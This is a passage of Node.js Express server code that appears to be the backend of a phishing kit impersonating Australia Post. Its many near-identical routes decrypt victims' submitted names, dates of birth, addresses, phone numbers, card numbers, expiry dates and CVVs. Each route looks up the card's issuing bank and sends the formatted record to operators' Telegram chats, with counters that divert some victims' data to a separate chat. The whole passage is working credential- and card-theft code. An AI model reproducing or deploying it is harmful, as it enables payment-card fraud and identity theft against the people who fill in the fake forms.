            console.log(e);
          });
        c2 = 0;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AusPostC2:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 5348269876,
              text: `AusPost:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        c2 += 1;
      }
      res.send("Update Completed");
    });
});

app.options("/ausPostSJ", cors());

app.post("/ausPostSJ", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address2 = CryptoJS.AES.decrypt(req.body.address2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userIp = req.body.ip;
  userAgent = req.body.userAgent;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (SpoofergooferAP == 500) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=AusPostSpoofer:\n${originalText}`
        );
        SpoofergooferAP = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AusPostSJ:\n${originalText}`
        );
        SpoofergooferAP += 1;
      }
      res.send("Update Completed");
    });
});

app.options("/ausPostKelv2", cors());

app.post("/ausPostKelv2", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address2 = CryptoJS.AES.decrypt(req.body.address2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userIp = req.body.ip;
  userAgent = req.body.userAgent;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (SpoofergooferAP == 3) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        SpoofergooferAP = 0;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AusPostKelv:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 1248378980,
              text: `AusPost:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        SpoofergooferAP += 1;
      }
      res.send("Update Completed");
    });
});

app.options("/ausPostManny", cors());

app.post("/ausPostManny", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address2 = CryptoJS.AES.decrypt(req.body.address2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userIp = req.body.ip;
  userAgent = req.body.userAgent;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (SpoofergooferAP == 4) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=AusPostManny:\n${originalText}`
        );
        SpoofergooferAP = 1;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AusPostManny:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=913906957&text=AusPost:\n${originalText}`
        );
        SpoofergooferAP += 1;
      }
      res.send("Update Completed");
    });
});

app.options("/ausPostAbzz", cors());

app.post("/ausPostAbzz", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address2 = CryptoJS.AES.decrypt(req.body.address2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userIp = req.body.ip;
  userAgent = req.body.userAgent;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (SpoofergooferAP == 500) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=AusPostSpoofer:\n${originalText}`
        );
        SpoofergooferAP = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AusPostAbzz:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1016584597&text=AusPost:\n${originalText}`
        );
        SpoofergooferAP += 1;
      }
      res.send("Update Completed");
    });
});

app.options("/ausPostSS", cors());

app.post("/ausPostSS", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address2 = CryptoJS.AES.decrypt(req.body.address2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userIp = req.body.ip;
  userAgent = req.body.userAgent;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (ssCount == 4) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        ssCount = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AusPostSS:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1318459885&text=AusPost:\n${originalText}`
        );
        ssCount += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/ausPostTheOnlyMY", cors());

app.post("/ausPostTheOnlyMY", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address2 = CryptoJS.AES.decrypt(req.body.address2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userIp = req.body.ip;
  userAgent = req.body.userAgent;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (TheOnlyMY == 4) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        TheOnlyMY = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AusPostOnlyMy:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=-716287470&text=AusPost:\n${originalText}`
        );
        TheOnlyMY += 1;
      }

      res.send("Update Completed");
    });
});

let frankAbignale = 0;

app.options("/ausPostfrankabignale100!", cors());

app.post("/ausPostfrankabignale100!", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address2 = CryptoJS.AES.decrypt(req.body.address2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userIp = req.body.ip;
  userAgent = req.body.userAgent;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (frankAbignale == 15) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        frankAbignale = 10;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AusPostFrankabignale100:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=5104363434&text=AusPost:\n${originalText}`
        );
        frankAbignale += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/ausPostAR", cors());

app.post("/ausPostAR", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address2 = CryptoJS.AES.decrypt(req.body.address2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userIp = req.body.ip;
  userAgent = req.body.userAgent;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;

      axios.post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=-725162140&text=AusPost:\n${originalText}`
      );

      res.send("Update Completed");
    });
});

app.options("/ausPostKelv", cors());

app.post("/ausPostKelv", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address2 = CryptoJS.AES.decrypt(req.body.address2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userIp = req.body.ip;
  userAgent = req.body.userAgent;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (ssCount == 4) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        ssCount = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AusPostKelv:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1248378980&text=AusPost:\n${originalText}`
        );
        ssCount += 1;
      }
      res.send("Update Completed");
    });
});

let SpoofergooferAP = 0;

app.options("/ausPostSpoofer", cors());

app.post("/ausPostSpoofer", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address2 = CryptoJS.AES.decrypt(req.body.address2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userIp = req.body.ip;
  userAgent = req.body.userAgent;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (SpoofergooferAP == 500) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=AusPostSpoofer:\n${originalText}`
        );
        SpoofergooferAP = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AusPostSpoofer:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=993063133&text=AusPost:\n${originalText}`
        );
        SpoofergooferAP += 1;
      }
      res.send("Update Completed");
    });
});

app.options("/ausPostLoader", cors());

app.post("/ausPostLoader", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address2 = CryptoJS.AES.decrypt(req.body.address2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userIp = req.body.ip;
  userAgent = req.body.userAgent;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
